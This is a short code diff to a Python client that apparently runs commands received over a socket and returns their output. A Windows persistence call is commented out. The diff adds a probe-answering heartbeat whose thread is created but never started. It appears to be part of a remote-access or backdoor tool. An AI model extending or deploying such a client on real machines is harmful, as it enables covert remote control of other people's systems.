@@ -54,6 +54,7 @@ class Client:
             self.secure_sock.close()
 
     def receive_commands(self):
+        
         receive_thread = threading.Thread(target=self._receive_commands)
         receive_thread.start()
         receive_thread.join()
@@ -242,6 +243,14 @@ class LinuxClient(Client):
             output = e.output
         finally:
             self.secure_sock.sendall(output.encode())
+    
+    def _answerProbes(self):
+        print('ANSWERING')
+        while True:
+            data = self.secure_sock.recv(1024)
+            if data == b'\x10\x10\x10':
+                print('.')
+                self.secure_sock.sendall(b'\x20\x20\x20')
 
 if __name__ == "__main__":
     if platform.system() == 'Windows':
@@ -249,4 +258,6 @@ if __name__ == "__main__":
         # client.persistence()
     else:
         client = LinuxClient('127.0.0.1', 8888)
+        threading.Thread(target=client._answerProbes)
+
     client.connect()
